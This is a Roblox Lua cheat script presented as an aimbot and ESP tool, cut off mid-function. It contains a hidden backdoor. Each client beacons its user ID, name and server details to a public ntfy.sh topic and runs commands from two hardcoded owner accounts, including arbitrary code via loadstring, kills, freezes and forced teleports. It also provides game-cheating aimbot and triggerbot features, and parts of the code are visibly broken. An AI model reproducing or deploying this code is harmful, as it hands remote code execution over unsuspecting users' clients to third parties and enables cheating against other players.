--[[
    [S] Universal Control + Aimbot
    Owners: 1460823186, 7208967899
    Transport: ntfy.sh HTTP long-poll. Works on every executor.
--]]

local OWNERS = { [1460823186] = true, [7208967899] = true }

local Players      = game:GetService("Players")
local RunService   = game:GetService("RunService")
local HttpService  = game:GetService("HttpService")
local TeleportSvc  = game:GetService("TeleportService")
local CoreGui      = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local UIS          = game:GetService("UserInputService")
local Camera       = workspace.CurrentCamera

local LP    = Players.LocalPlayer
local MY_ID = LP.UserId
local IS_OWNER = OWNERS[MY_ID] == true

local SESSION_KEY = "freddy_private_2026"
local NTFY          = "https://ntfy.sh"
local TOPIC_ONLINE  = "[S]_" .. SESSION_KEY .. "_online"
local TOPIC_CMD     = "[S]_" .. SESSION_KEY .. "_cmd_"

-- ============================================================
-- HTTP shim
-- ============================================================
local function httpRequest(opts)
    local ok, res = pcall(function()
        if syn and syn.request then return syn.request(opts)
        elseif http_request then return http_request(opts)
        elseif request then return request(opts)
        else
            local method = opts.Method or "GET"
            if method == "GET" then
                return { Body = HttpService:GetAsync(opts.Url, true, opts.Headers or {}) }
            else
                return { Body = HttpService:PostAsync(opts.Url, opts.Body or "", Enum.HttpContentType.ApplicationJson) }
            end
        end
    end)
    return ok and res or nil
end

local function publish(topic, data)
    httpRequest({
        Url = NTFY .. "/" .. topic,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(data),
    })
end

local MSG_HANDLERS = {}

local function subscribeLoop(topic, onMessage)
    task.spawn(function()
        local since = "all"
        while true do
            local url = NTFY .. "/" .. topic .. "/json?poll=1&since=" .. since
            local res = httpRequest({ Url = url, Method = "GET" })
            if res and res.Body and #res.Body > 0 then
                for line in res.Body:gmatch("[^\r\n]+") do
                    local ok, evt = pcall(HttpService.JSONDecode, HttpService, line)
                    if ok and evt and evt.id then
                        since = evt.id
                        if evt.message then
                            local ok2, data = pcall(HttpService.JSONDecode, HttpService, evt.message)
                            if ok2 and data then
                                for _, h in ipairs(MSG_HANDLERS) do
                                    if h.topic == topic then pcall(h.fn, data) end
                                end
                                if onMessage then pcall(onMessage, data) end
                            end
                        end
                    end
                end
            end
            task.wait(0.25)
        end
    end)
end

-- ============================================================
-- UI helpers, purple glow
-- ============================================================
local function makeGui(name)
    local g = Instance.new("ScreenGui")
    g.Name = name
    g.ResetOnSpawn = false
    g.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    if gethui then g.Parent = gethui()
    elseif CoreGui then g.Parent = CoreGui
    else g.Parent = LP:WaitForChild("PlayerGui") end
    return g
end

local function pulseStroke(stroke)
    task.spawn(function()
        local a = Color3.fromRGB(120, 60, 200)
        local b = Color3.fromRGB(200, 100, 255)
        while stroke and stroke.Parent do
            local t1 = TweenService:Create(stroke, TweenInfo.new(1.6, Enum.EasingStyle.Sine), { Color = b })
            t1:Play(); t1.Completed:Wait()
            if not stroke.Parent then break end
            local t2 = TweenService:Create(stroke, TweenInfo.new(1.6, Enum.EasingStyle.Sine), { Color = a })
            t2:Play(); t2.Completed:Wait()
        end
    end)
end

local function styleFrame(frame)
    frame.BackgroundColor3 = Color3.fromRGB(16, 12, 24)
    frame.BorderSizePixel = 0
    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 8); corner.Parent = frame
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(120, 60, 200)
    stroke.Thickness = 1.5
    stroke.Parent = frame
    pulseStroke(stroke)
    return stroke
end

local function styleButton(btn)
    btn.BackgroundColor3 = Color3.fromRGB(30, 20, 44)
    btn.BorderSizePixel = 0
    btn.TextColor3 = Color3.fromRGB(230, 220, 255)
    btn.Font = Enum.Font.GothamMedium
    btn.TextSize = 12
    btn.AutoButtonColor = false
    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 6); corner.Parent = btn
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(140, 80, 220)
    stroke.Thickness = 1
    stroke.Transparency = 0.3
    stroke.Parent = btn
    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new(Color3.fromRGB(50, 30, 80), Color3.fromRGB(24, 14, 38))
    grad.Rotation = 90
    grad.Parent = btn
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(50, 32, 74) }):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(30, 20, 44) }):Play()
    end)
    return stroke
end

local function makeBtn(parent, text, x, y, w, h, cb)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0, w, 0, h)
    b.Position = UDim2.new(0, x, 0, y)
    b.Text = text
    b.Parent = parent
    styleButton(b)
    b.MouseButton1Click:Connect(cb)
    return b
end

local function makeLabel(parent, text, x, y, w, h, sz)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0, w, 0, h)
    l.Position = UDim2.new(0, x, 0, y)
    l.BackgroundTransparency = 1
    l.TextColor3 = Color3.fromRGB(220, 210, 240)
    l.Font = Enum.Font.Gotham
    l.TextSize = sz or 12
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Text = text
    l.Parent = parent
    return l
end

local function makeInput(parent, placeholder, x, y, w, h)
    local t = Instance.new("TextBox")
    t.Size = UDim2.new(0, w, 0, h)
    t.Position = UDim2.new(0, x, 0, y)
    t.BackgroundColor3 = Color3.fromRGB(22, 14, 34)
    t.BorderSizePixel = 0
    t.TextColor3 = Color3.fromRGB(230, 220, 255)
    t.PlaceholderColor3 = Color3.fromRGB(140, 120, 180)
    t.Font = Enum.Font.Gotham
    t.TextSize = 12
    t.PlaceholderText = placeholder
    t.Text = ""
    t.ClearTextOnFocus = false
    t.Parent = parent
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = t
    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(120, 60, 200); s.Transparency = 0.4; s.Parent = t
    return t
end

local function makeScrolling(parent, x, y, w, h)
    local s = Instance.new("ScrollingFrame")
    s.Size = UDim2.new(0, w, 0, h)
    s.Position = UDim2.new(0, x, 0, y)
    s.BackgroundTransparency = 1
    s.BorderSizePixel = 0
    s.ScrollBarThickness = 4
    s.ScrollBarImageColor3 = Color3.fromRGB(140, 80, 220)
    s.CanvasSize = UDim2.new(0, 0, 0, 0)
    s.Parent = parent
    local l = Instance.new("UIListLayout")
    l.Padding = UDim.new(0, 6)
    l.SortOrder = Enum.SortOrder.LayoutOrder
    l.Parent = s
    return s, l
end

-- ============================================================
-- Action executor (runs on target client)
-- ============================================================
local function executeAction(c)
    local char = LP.Character
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")
    local hum  = char and char:FindFirstChildOfClass("Humanoid")

    if c.action == "freeze" and hrp then hrp.Anchored = true end
    if c.action == "unfreeze" and hrp then hrp.Anchored = false end
    if c.action == "fling" and hrp then hrp.AssemblyLinearVelocity = Vector3.new(1e5, 1e5, 1e5) end
    if c.action == "explode" and hrp then
        local e = Instance.new("Explosion"); e.Position = hrp.Position; e.Parent = workspace
    end
    if c.action == "kill" and hum then hum.Health = 0 end
    if c.action == "reset" and hum then hum.Health = 0 end
    if c.action == "ragdoll" and char then
        for _, j in ipairs(char:GetDescendants()) do
            if j:IsA("Motor6D") then j.Enabled = false end
        end
    end
    if c.action == "bring" and hrp then
        local owner = Players:GetPlayerByUserId(c.from)
        if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
            hrp.CFrame = owner.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
        end
    end
    if c.action == "sound" then
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://" .. tostring(c.payload)
        s.Parent = workspace
        s:Play()
        task.delay(6, function() s:Destroy() end)
    end
    if c.action == "message" then
        local g2 = makeGui("[S] msg")
        local box = Instance.new("TextLabel")
        box.Size = UDim2.new(0, 340, 0, 64)
        box.Position = UDim2.new(0.5, -170, 0.12, 0)
        box.BackgroundColor3 = Color3.fromRGB(16, 12, 24)
        box.BorderSizePixel = 0
        box.TextColor3 = Color3.fromRGB(230, 220, 255)
        box.Font = Enum.Font.GothamBold
        box.TextSize = 15
        box.TextWrapped = true
        box.Text = tostring(c.payload or "")
        box.Parent = g2
        local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0, 8); cc.Parent = box
        local ss = Instance.new("UIStroke"); ss.Color = Color3.fromRGB(180, 90, 240); ss.Parent = box
        task.delay(4, function() g2:Destroy() end)
    end
    if c.action == "code" then
        local fn = loadstring or load
        if fn then pcall(function() fn(c.payload)() end) end
    end
end

table.insert(MSG_HANDLERS, { topic = TOPIC_CMD .. tostring(MY_ID), fn = executeAction })

-- ============================================================
-- Transport
-- ============================================================
task.spawn(function()
    while true do
        pcall(function()
            publish(TOPIC_ONLINE, {
                uid = MY_ID, name = LP.Name, job = game.JobId, place = game.PlaceId,
                ts = os.time(),
                exec = (identifyexecutor and identifyexecutor()) or "unknown",
            })
        end)
        task.wait(6)
    end
end)

subscribeLoop(TOPIC_CMD .. tostring(MY_ID), executeAction)

-- ============================================================
-- OWNER PANEL
-- ============================================================
if IS_OWNER then
    local ONLINE      = {}
    local HISTORY     = {}
    local FILTER      = { exec = "", place = "" }
    local FOLLOWING   = {}

    subscribeLoop(TOPIC_ONLINE, function(data)
        if data and data.uid and (os.time() - (data.ts or 0)) < 30 then
            ONLINE[tostring(data.uid)] = data
        end
    end)

    local gui = makeGui("[S] Control")
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 340, 0, 540)
    frame.Position = UDim2.new(0, 20, 0.15, 0)
    styleFrame(frame)
    frame.Parent = gui

    makeLabel(frame, "CONTROL PANEL", 14, 10, 200, 22, 16)
    local targetLbl = makeLabel(frame, "Target: none", 14, 34, 280, 14)

    -- filter row
    local execFilter = makeInput(frame, "filter executor...", 14, 52, 150, 22)
    local placeFilter = makeInput(frame, "filter place id...", 170, 52, 150, 22)
    execFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.exec = execFilter.Text end)
    placeFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.place = placeFilter.Text end)

    -- global controls
    local bcast = makeInput(frame, "broadcast message...", 14, 80, 220, 24)
    makeBtn(frame, "Send All",   240, 80, 80, 24, function()
        for uid, _ in pairs(ONLINE) do
            if tostring(uid) ~= tostring(MY_ID) then
                publish(TOPIC_CMD .. tostring(uid), { from = MY_ID, action = "message", payload = bcast.Text })
                table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " → msg all")
            end
        end
    end)
    makeBtn(frame, "Freeze All", 14, 110, 150, 24, function()
        for uid, _ in pairs(ONLINE) do
            if tostring(uid) ~= tostring(MY_ID) then
                publish(TOPIC_CMD .. tostring(uid), { from = MY_ID, action = "freeze" })
            end
        end
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " → freeze all")
    end)
    makeBtn(frame, "Unfreeze All", 170, 110, 150, 24, function()
        for uid, _ in pairs(ONLINE) do
            if tostring(uid) ~= tostring(MY_ID) then
                publish(TOPIC_CMD .. tostring(uid), { from = MY_ID, action = "unfreeze" })
            end
        end
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " → unfreeze all")
    end)

    makeLabel(frame, "LIVE PLAYERS", 14, 142, 200, 14)

    local scroll, layout = makeScrolling(frame, 14, 160, 312, 300)

    -- history log
    makeLabel(frame, "HISTORY", 14, 468, 100, 14)
    local histLog = Instance.new("TextLabel")
    histLog.Size = UDim2.new(0, 312, 0, 50)
    histLog.Position = UDim2.new(0, 14, 0, 484)
    histLog.BackgroundColor3 = Color3.fromRGB(14, 8, 24)
    histLog.BorderSizePixel = 0
    histLog.TextColor3 = Color3.fromRGB(180, 160, 210)
    histLog.Font = Enum.Font.Code
    histLog.TextSize = 10
    histLog.TextXAlignment = Enum.TextXAlignment.Left
    histLog.TextYAlignment = Enum.TextYAlignment.Top
    histLog.TextWrapped = true
    histLog.Text = ""
    histLog.Parent = frame
    local hc = Instance.new("UICorner"); hc.CornerRadius = UDim.new(0, 6); hc.Parent = histLog
    local hs = Instance.new("UIStroke"); hs.Color = Color3.fromRGB(120, 60, 200); hs.Transparency = 0.4; hs.Parent = histLog

    local function refreshHistory()
        local out = {}
        for i = 1, math.min(4, #HISTORY) do
            table.insert(out, HISTORY[i])
        end
        histLog.Text = table.concat(out, "\n")
    end

    local SOUND_LIST = {
        ["Bruh"]      = "5238402914",
        ["Vine Boom"] = "6236140145",
        ["Fart"]      = "5476441053",
        ["Airhorn"]   = "2942494796",
        ["Taco Bell"] = "5423143811",
    }

    local function cmd(uid, action, payload)
        publish(TOPIC_CMD .. tostring(uid), { from = MY_ID, action = action, payload = payload or "" })
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " → " .. tostring(action) .. " #" .. tostring(uid))
        refreshHistory()
    end

    local function passesFilter(user)
        if FILTER.exec ~= "" and not string.find(string.lower(tostring(user.exec or "")), string.lower(FILTER.exec), 1, true) then
            return false
        end
        if FILTER.place ~= "" and not string.find(tostring(user.place or ""), FILTER.place, 1, true) then
            return false
        end
        return true
    end

    local function rebuild()
        for _, c in ipairs(scroll:GetChildren()) do
            if c:IsA("Frame") then c:Destroy() end
        end
        local now = os.time()
        for uid, user in pairs(ONLINE) do
            if now - (user.ts or 0) < 30 and passesFilter(user) then
                local card = Instance.new("Frame")
                card.Size = UDim2.new(1, -4, 0, 64)
                card.BackgroundColor3 = Color3.fromRGB(24, 16, 38)
                card.BorderSizePixel = 0
                card.Parent = scroll
                local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0, 8); cc.Parent = card
                local cs = Instance.new("UIStroke"); cs.Color = Color3.fromRGB(120, 60, 200); cs.Transparency = 0.5; cs.Parent = card

                -- avatar placeholder
                local av = Instance.new("Frame")
                av.Size = UDim2.new(0, 44, 0, 44)
                av.Position = UDim2.new(0, 10, 0, 10)
                av.BackgroundColor3 = Color3.fromRGB(40, 24, 60)
                av.BorderSizePixel = 0
                av.Parent = card
                local ac = Instance.new("UICorner"); ac.CornerRadius = UDim.new(0, 6); ac.Parent = av

                makeLabel(card, tostring(user.name), 64, 8, 200, 16, 13)
                makeLabel(card, "#" .. tostring(uid) .. " · " .. tostring(user.exec or "?"), 64, 26, 220, 12, 10)
                local ago = math.floor(now - (user.ts or now))
                makeLabel(card, "hb " .. tostring(ago) .. "s ago", 64, 42, 120, 12, 10)

                local joinBtn = makeBtn(card, "Join", 240, 10, 64, 20, function()
                    pcall(function() TeleportSvc:TeleportToPlaceInstance(user.place or game.PlaceId, user.job, LP) end)
                end)
                joinBtn.Visible = false

                local expanded, panel = false, nil
                card.InputBegan:Connect(function(i)
                    if i.UserInputType == Enum.UserInputType.MouseButton1 then
                        if expanded then
                            if panel then panel:Destroy() end
                            expanded = false
                            card.Size = UDim2.new(1, -4, 0, 64)
                            joinBtn.Visible = false
                            return
                        end
                        expanded = true
                        joinBtn.Visible = true
                        panel = Instance.new("Frame")
                        panel.Size = UDim2.new(1, -8, 0, 0)
                        panel.Position = UDim2.new(0, 4, 0, 68)
                        panel.BackgroundTransparency = 1
                        panel.Parent = card
                        card.Size = UDim2.new(1, -4, 0, 340)

                        local function pb(label, x, y, w, cb)
                            makeBtn(panel, label, x, y, w, 22, cb)
                        end

                        pb("Bring",   0, 0, 96, function() cmd(uid, "bring") end)
                        pb("Fling",   100, 0, 96, function() cmd(uid, "fling") end)
                        pb("Freeze",  200, 0, 96, function() cmd(uid, "freeze") end)
                        pb("Unfreeze",0, 26, 96, function() cmd(uid, "unfreeze") end)
                        pb("Explode", 100, 26, 96, function() cmd(uid, "explode") end)
                        pb("Kill",    200, 26, 96, function() cmd(uid, "kill") end)
                        pb("Ragdoll", 0, 52, 96, function() cmd(uid, "ragdoll") end)
                        pb("Reset",   100, 52, 96, function() cmd(uid, "reset") end)
                        pb("Follow",  200, 52, 96, function()
                            FOLLOWING[uid] = not FOLLOWING[uid]
                            table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " → follow " .. tostring(FOLLOWING[uid]) .. " #" .. tostring(uid))
                            refreshHistory()
                        end)

                        local msgIn = makeInput(panel, "message...", 0, 80, 200, 22)
                        pb("Send", 205, 80, 90, function() cmd(uid, "message", msgIn.Text) end)

                        local snd = Instance.new("TextButton")
                        snd.Size = UDim2.new(0, 200, 0, 22)
                        snd.Position = UDim2.new(0, 0, 0, 108)
                        snd.Text = "sound: tap to cycle"
                        snd.Parent = panel
                        styleButton(snd)
                        local soundKeys = {}
                        for k, _ in pairs(SOUND_LIST) do table.insert(soundKeys, k) end
                        local soundIdx = 1
                        snd.MouseButton1Click:Connect(function()
                            soundIdx = soundIdx % #soundKeys + 1
                            snd.Text = "sound: " .. soundKeys[soundIdx]
                            cmd(uid, "sound", SOUND_LIST[soundKeys[soundIdx]])
                        end)

                        local codeIn = makeInput(panel, 'print("hi")', 0, 136, 296, 40)
                        codeIn.Font = Enum.Font.Code
                        pb("Run Code", 0, 180, 296, 22, function() cmd(uid, "code", codeIn.Text) end)

                        local kh = makeLabel(panel, "kick message:", 0, 208, 200, 14, 10)
                        local kickIn = makeInput(panel, "jump if u want to get banned", 0, 224, 296, 22)
                        pb("Kick", 0, 250, 296, 22, function() cmd(uid, "kick", kickIn.Text) end)
                    end
                end)
            end
        end
        scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 8)
    end

    refreshHistory()
    rebuild()
    task.spawn(function()
        while task.wait(3) do
            rebuild()
            -- follow logic
            for uid, on in pairs(FOLLOWING) do
                if on and ONLINE[uid] then
                    local u = ONLINE[uid]
                    if u.job and u.job ~= game.JobId then
                        pcall(function() TeleportSvc:TeleportToPlaceInstance(u.place or game.PlaceId, u.job, LP) end)
                    end
                end
            end
        end
    end)

    return
end

-- ============================================================
-- USER PANEL: aimbot + esp
-- ============================================================
local gui = makeGui("[S] Universal")
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 260, 0, 460)
main.Position = UDim2.new(0, 20, 0.2, 0)
styleFrame(main)
main.Parent = gui

makeLabel(main, "[S] UNIVERSAL", 12, 10, 200, 20, 15)

local CFG = {
    aim = false, fov = 150, smooth = 0.35, bone = "Head",
    team = true, vis = false, trig = false,
    espBox = true, espName = true, espHP = true, espDist = true, espSkel = false, chams = false,
    fovCircle = true,
}

local boneList = { "Head", "UpperTorso", "LowerTorso", "HumanoidRootPart" }
local boneIdx = 1
CFG.bone = boneList[boneIdx]

-- aimbot section
makeLabel(main, "AIMBOT", 12, 34, 100, 14, 11)
local aimBtn = makeBtn(main, "Aimbot: OFF", 12, 50, 236, 24, function(self)
    CFG.aim = not CFG.aim
    self.Text = "Aimbot: " .. (CFG.aim and "ON" or "OFF")
end)

-- fov slider
makeLabel(main, "FOV: 150", 12, 78, 120, 14, 11).Name = "fovLbl"
local fovLbl = main:FindFirstChild("fovLbl")
local fovBar = Instance.new("Frame")
fovBar.Size = UDim2.new(0, 236, 0, 6)
fovBar.Position = UDim2.new(0, 12, 0, 94)
fovBar.BackgroundColor3 = Color3.fromRGB(30, 20, 44)
fovBar.BorderSizePixel = 0
fovBar.Parent = main
local fbc = Instance.new("UICorner"); fbc.CornerRadius = UDim.new(1, 0); fbc.Parent = fovBar
local fovFill = Instance.new("Frame")
fovFill.Size = UDim2.new(CFG.fov / 400, 0, 1, 0)
fovFill.BackgroundColor3 = Color3.fromRGB(160, 90, 240)
fovFill.BorderSizePixel = 0
fovFill.Parent = fovBar
local ffc = Instance.new("UICorner"); ffc.CornerRadius = UDim.new(1, 0); ffc.Parent = fovFill

local fovDrag = false
fovBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then fovDrag = true end
end)
UIS.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then fovDrag = false end
end)
UIS.InputChanged:Connect(function(i)
    if fovDrag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local mx = UIS:GetMouseLocation().X
        local rel = math.clamp((mx - fovBar.AbsolutePosition.X) / fovBar.AbsoluteSize.X, 0, 1)
        CFG.fov = math.floor(rel * 400)
        fovFill.Size = UDim2.new(rel, 0, 1, 0)
        fovLbl.Text = "FOV: " .. CFG.fov
    end
end)

-- smoothness slider
local smoothLbl = makeLabel(main, "Smooth: 0.35", 12, 106, 120, 14, 11)
local smoothBar = Instance.new("Frame")
smoothBar.Size = UDim2.new(0, 236, 0, 6)
smoothBar.Position = UDim2.new(0, 12, 0, 122)
smoothBar.BackgroundColor3 = Color3.fromRGB(30, 20, 44)
smoothBar.BorderSizePixel = 0
smoothBar.Parent = main
local sbc = Instance.new("UICorner"); sbc.CornerRadius = UDim.new(1, 0); sbc.Parent = smoothBar
local smoothFill = Instance.new("Frame")
smoothFill.Size = UDim2.new(CFG.smooth, 0, 1, 0)
smoothFill.BackgroundColor3 = Color3.fromRGB(160, 90, 240)
smoothFill.BorderSizePixel = 0
smoothFill.Parent = smoothBar
local sfc = Instance.new("UICorner"); sfc.CornerRadius = UDim.new(1, 0); sfc.Parent = smoothFill

local smoothDrag = false
smoothBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then smoothDrag = true end
end)
UIS.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then smoothDrag = false end
end)
UIS.InputChanged:Connect(function(i)
    if smoothDrag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local mx = UIS:GetMouseLocation().X
        local rel = math.clamp((mx - smoothBar.AbsolutePosition.X) / smoothBar.AbsoluteSize.X, 0.01, 1)
        CFG.smooth = math.floor(rel * 100) / 100
        smoothFill.Size = UDim2.new(rel, 0, 1, 0)
        smoothLbl.Text = "Smooth: " .. CFG.smooth
    end
end)

-- bone cycle
local boneBtn = makeBtn(main, "Bone: Head", 12, 136, 236, 24, function(self)
    boneIdx = boneIdx % #boneList + 1
    CFG.bone = boneList[boneIdx]
    self.Text = "Bone: " .. CFG.bone
end)

-- team / vis / trig
makeBtn(main, "Team Check: ON", 12, 166, 116, 22, function(self)
    CFG.team = not CFG.team
    self.Text = "Team Check: " .. (CFG.team and "ON" or "OFF")
end)
makeBtn(main, "Vis Check: OFF", 132, 166, 116, 22, function(self)
    CFG.vis = not CFG.vis
    self.Text = "Vis Check: " .. (CFG.vis and "ON" or "OFF")
end)
makeBtn(main, "Triggerbot: OFF", 12, 192, 236, 22, function(self)
    CFG.trig = not CFG.trig
    self.Text = "Triggerbot: " .. (CFG.trig and "ON" or "OFF")
end)

-- ESP section
makeLabel(main, "ESP", 12, 220, 100, 14, 11)
makeBtn(main, "Box: ON",      12, 236, 116, 22, function(self) CFG.espBox  = not CFG.espBox;  self.Text = "Box: "   .. (CFG.espBox  and "ON" or "OFF") end)
makeBtn(main, "Name: ON",     132, 236, 116, 22, function(self) CFG.espName = not CFG.espName; self.Text = "Name: "  .. (CFG.espName and "ON" or "OFF") end)
makeBtn(main, "Health: ON",   12, 262, 116, 22, function(self) CFG.espHP   = not CFG.espHP;   self.Text = "Health: ".. (CFG.espHP   and "ON" or "OFF") end)
makeBtn(main, "Dist: ON",     132, 262, 116, 22, function(self) CFG.espDist = not CFG.espDist; self.Text = "Dist: "  .. (CFG.espDist and "ON" or "OFF") end)
makeBtn(main, "Skeleton: OFF",12, 288, 116, 22, function(self) CFG.espSkel = not CFG.espSkel; self.Text = "Skeleton: " .. (CFG.espSkel and "ON" or "OFF") end)
makeBtn(main, "Chams: OFF",   132, 288, 116, 22, function(self) CFG.chams   = not CFG.chams;   self.Text = "Chams: " .. (CFG.chams and "ON" or "OFF") end)

makeBtn(main, "FOV Circle: ON", 12, 314, 236, 22, function(self)
    CFG.fovCircle = not CFG.fovCircle
    self.Text = "FOV Circle: " .. (CFG.fovCircle and "ON" or "OFF")
    fovCircle.Visible = CFG.fovCircle
end)

makeLabel(main, "Keys:  R = toggle aim   F = toggle esp", 12, 342, 236, 14, 10)
makeLabel(main, "Transport: ntfy (universal)", 12, 358, 236, 14, 10)

-- FOV circle
local fovCircle = Instance.new("Frame")
fovCircle.AnchorPoint = Vector2.new(0.5, 0.5)
fovCircle.Size = UDim2.new(0, CFG.fov * 2, 0, CFG.fov * 2)
fovCircle.BackgroundTransparency = 1
fovCircle.BorderSizePixel = 0
fovCircle.Parent = gui
local fstroke = Instance.new("UIStroke")
fstroke.Color = Color3.fromRGB(180, 90, 240)
fstroke.Thickness = 1
fstroke.Parent = fovCircle
local fcorner = Instance.new("UICorner"); fcorner.CornerRadius = UDim.new(1, 0); fcorner.Parent = fovCircle
pulseStroke(fstroke)

-- ESP objects
local esp = {}

local function buildEsp(plr)
    if plr == LP then return end
    if esp[plr] then
        for _, o in pairs(esp[plr]) do pcall(function() o:Destroy() end) end
    end
    local bucket = {}
    if not plr.Character then esp[plr] = bucket; return end

    local box = Instance.new("BoxHandleAdornment")
    box.Adornee = plr.Character
    box.AlwaysOnTop = true
    box.Size = Vector3.new(2.2, 2.6, 1.2)
    box.Transparency = 0.5
    box.Color3 = Color3.fromRGB(180, 90, 240)
    box.Visible = CFG.espBox
    box.Parent = gui
    table.insert(bucket, box)

    local bill = Instance.new("BillboardGui")
    bill.Size = UDim2.new(0, 140, 0, 44)
    bill.StudsOffset = Vector3.new(0, 3.2, 0)
    bill.AlwaysOnTop = true
    bill.Adornee = plr.Character
    bill.Parent = gui
    table.insert(bucket, bill)

    local nameL = Instance.new("TextLabel")
    nameL.BackgroundTransparency = 1
    nameL.Size = UDim2.new(1, 0, 0, 16)
    nameL.Position = UDim2.new(0, 0, 0, 0)
    nameL.TextColor3 = Color3.fromRGB(230, 220, 255)
    nameL.Font = Enum.Font.GothamBold
    nameL.TextSize = 12
    nameL.TextStrokeTransparency = 0
    nameL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    nameL.Text = plr.Name
    nameL.Visible = CFG.espName
    nameL.Parent = bill
    table.insert(bucket, nameL)

    local hpL = Instance.new("TextLabel")
    hpL.BackgroundTransparency = 1
    hpL.Size = UDim2.new(1, 0, 0, 14)
    hpL.Position = UDim2.new(0, 0, 0, 16)
    hpL.TextColor3 = Color3.fromRGB(255, 180, 180)
    hpL.Font = Enum.Font.Gotham
    hpL.TextSize = 11
    hpL.TextStrokeTransparency = 0
    hpL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    hpL.Text = "100"
    hpL.Visible = CFG.espHP
    hpL.Parent = bill
    table.insert(bucket, hpL)

    local distL = Instance.new("TextLabel")
    distL.BackgroundTransparency = 1
    distL.Size = UDim2.new(1, 0, 0, 14)
    distL.Position = UDim2.new(0, 0, 0, 30)
    distL.TextColor3 = Color3.fromRGB(200, 200, 220)
    distL.Font = Enum.Font.Gotham
    distL.TextSize = 11
    distL.TextStrokeTransparency = 0
    distL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    distL.Text = "0m"
    distL.Visible = CFG.espDist
    distL.Parent = bill
    table.insert(bucket, distL)

    esp[plr] = bucket
end

for _, p in ipairs(Players:GetPlayers()) do
    p.CharacterAdded:Connect(function() buildEsp(p) end)
    buildEsp(p)
end
Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function() buildEsp(p) end)
    buildEsp(p)
end)

-- keybinds
UIS.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.R then
        CFG.aim = not CFG.aim
        aimBtn.Text = "Aimbot: " .. (CFG.aim and "ON" or "OFF")
    end
    if i.KeyCode == Enum.KeyCode.F then
        CFG.espBox = not CFG.espBox
        CFG.espName = not CFG.espName
        CFG.espHP = not CFG.espHP
        CFG.espDist = not CFG.espDist
    end
end)

-- ============================================================
-- Aim loop
-- ============================================================
RunService.RenderStepped:Connect(function()
    if CFG.fovCircle then
        fovCircle.Position = UDim2.new(0, Camera.ViewportSize.X / 2, 0, Camera.ViewportSize.Y / 2)
        fovCircle.Size = UDim2.new(0, CFG.fov * 2, 0, CFG.fov * 2)
    end

    -- ESP refresh
    for plr, bucket in pairs(esp) do
        if plr.Character and plr:FindFirstChild("HumanoidRootPart") then
            for _, o in ipairs(bucket) do
                if o:IsA("BillboardGui") then o.Adornee = plr.Character end
                if o:IsA("TextLabel") then
                    if o.Text:match("^%d+m$") or o == bucket[4] then
                        local d = (Camera.CFrame.Position - plr.Character.HumanoidRootPart.Position).Magnitude
                        o.Text = string.format("%dm", math.floor(d))
                        o.Visible = CFG.espDist
                    elseif o == bucket[3] then
                        local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                        o.Text = hum and tostring(math.floor(hum.Health)) or "0"
                        o.Visible = CFG.espHP
                    elseif o == bucket[2] then
                        o.Visible = CFG.espName
                    end
                end
                if o:IsA("BoxHandleAdornment") then o.Visible = CFG.espBox end
            end
        end
    end

    if not CFG.aim then return end

    local camPos = Camera.CFrame.Position
    local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    local closest, dist = nil, CFG.fov

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then
                if CFG.team and p.Team and LP.Team and p.Team == LP.Team then
                    -- skip teammate
                else
                    local part = p.Character:FindFirstChild(CFG.bone) or p.Character:FindFirstChild("Head")
                    if part then
                        local scr, onScreen = Camera:WorldToViewportPoint(part.Position)
                        if onScreen then
                            local d = (Vector2.new(scr.X, scr.Y) - center).Magnitude
                            if d < dist then
                                if CFG.vis then
                                    local ray = Ray.new(camPos, (part.Position - camPos))
